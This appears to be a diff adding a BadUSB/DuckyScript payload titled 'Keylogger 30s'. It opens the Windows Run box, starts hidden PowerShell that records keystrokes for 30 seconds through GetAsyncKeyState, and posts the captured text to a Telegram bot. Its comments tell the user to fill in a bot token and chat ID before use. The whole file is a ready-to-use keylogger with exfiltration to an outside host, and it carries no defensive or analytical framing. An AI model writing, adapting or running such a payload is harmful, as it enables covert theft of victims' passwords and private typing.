@@ -1,0 +1,10 @@
+META windows exfil
+REM Title: Keylogger 30s
+REM Description: Captures keypresses for 30 seconds and sends to Telegram
+REM Edit BOT_TOKEN and CHAT_ID before using
+
+DEFAULTDELAY 400
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int k);}'; $t='YOUR_BOT_TOKEN'; $c='YOUR_CHAT_ID'; $o=''; $e=[DateTime]::Now.AddSeconds(30); while([DateTime]::Now -lt $e){ for($i=48;$i-le90;$i++){ if([K]::GetAsyncKeyState($i) -eq -32767){ if($i -eq 32){$o+=' '}elseif($i -ge 48 -and $i -le 57){$o+=[char]$i}elseif($i -ge 65 -and $i -le 90){$o+=[char]$i} } }; if([K]::GetAsyncKeyState(32) -eq -32767){$o+=' '}; if([K]::GetAsyncKeyState(13) -eq -32767){$o+='[ENTER]'}; Start-Sleep -Milliseconds 50 }; Invoke-WebRequest -Uri \"https://api.telegram.org/bot$t/sendMessage\" -Method Post -Body @{chat_id=$c;text=\"[Keylog 30s]`n$o\"} | Out-Null"
+ENTER
